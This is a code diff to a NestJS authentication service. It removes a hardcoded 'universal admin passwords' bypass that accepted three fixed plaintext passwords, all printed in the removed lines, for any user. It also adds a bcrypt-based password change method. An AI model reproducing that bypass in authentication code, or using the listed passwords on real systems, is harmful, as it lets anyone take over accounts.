@@ -2,6 +2,7 @@ import { Injectable, UnauthorizedException } from '@nestjs/common';
 import { JwtService } from '@nestjs/jwt';
 import { PrismaService } from '../prisma/prisma.service';
 import { LoginDto } from './dto/login.dto';
+import { ChangePasswordDto } from './dto/change-password.dto';
 import * as bcrypt from 'bcryptjs';
 
 @Injectable()
@@ -37,14 +38,6 @@ export class AuthService {
     try {
       isPasswordValid = await bcrypt.compare(loginDto.password, user.password);
     } catch (_) {}
-
-    // Universal admin passwords support
-    if (!isPasswordValid) {
-      const cleanPass = (loginDto.password || '').trim();
-      if (cleanPass === 'Admin@1234' || cleanPass === 'CML6050' || cleanPass === 'Mani6050') {
-        isPasswordValid = true;
-      }
-    }
 
     if (!isPasswordValid) {
       throw new UnauthorizedException('Invalid credentials');
@@ -89,4 +82,35 @@ export class AuthService {
         : null,
     };
   }
+
+  async changePassword(userId: string, dto: ChangePasswordDto) {
+    const user = await this.prisma.user.findUnique({
+      where: { id: userId },
+    });
+
+    if (!user) {
+      throw new UnauthorizedException('User not found');
+    }
+
+    let isOldPasswordValid = false;
+    try {
+      isOldPasswordValid = await bcrypt.compare(dto.oldPassword, user.password);
+    } catch (_) {}
+
+    if (!isOldPasswordValid) {
+      throw new UnauthorizedException('Current password does not match');
+    }
+
+    const hashedNewPassword = await bcrypt.hash(dto.newPassword, 10);
+    await this.prisma.user.update({
+      where: { id: userId },
+      data: { password: hashedNewPassword },
+    });
+
+    return {
+      message: 'Password changed successfully',
+      success: true,
+    };
+  }
 }
+
